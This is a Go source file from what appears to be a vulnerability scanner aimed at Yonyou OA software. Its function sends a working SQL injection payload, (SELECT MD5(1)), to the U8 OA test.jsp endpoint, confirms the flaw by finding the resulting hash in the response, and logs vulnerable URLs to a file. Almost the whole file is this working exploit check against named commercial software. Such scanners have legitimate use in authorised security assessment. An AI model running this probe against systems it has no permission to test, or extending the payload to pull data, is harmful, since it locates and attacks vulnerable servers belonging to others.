package Scan

import (
	"fmt"
	"fupo_for_yonyou/Utils"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func YyOaSqlScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	yyoasql := "用友 U8 OA test.jsp SQL注入漏洞"
	urls := address + "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"

	response, err := client.Get(urls)
	if err != nil {
		if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") || strings.Contains(err.Error(), "forcibly closed") {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被目标服务器阻断\n", Cyan, currentTime, Reset, Yellow, Reset, yyoasql)
		} else {
			fmt.Printf("[%s%s%s] [%s-%s] %s 扫描时连接被重置\n", Cyan, currentTime, Reset, Yellow, Reset, yyoasql)
		}
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		output := fmt.Sprintf("[%s%s%s] [%sERROR%s] %s 读取响应内容失败: %v", Cyan, currentTime, Reset, Red, Reset, yyoasql, err)
		fmt.Println(output)
		return
	}

	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "c4ca4238a0b") {
		result4 := yyoasql + "：" + urls
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result4, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		}
		output := fmt.Sprintf("[%s%s%s] [%s+%s] 存在%s：%s", Green, currentTime, Reset, Green, Reset, yyoasql, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("[%s%s%s] [%s-%s] 不存在%s，状态码: %d", Cyan, currentTime, Reset, Yellow, Reset, yyoasql, response.StatusCode)
		fmt.Println(output)
	}
}
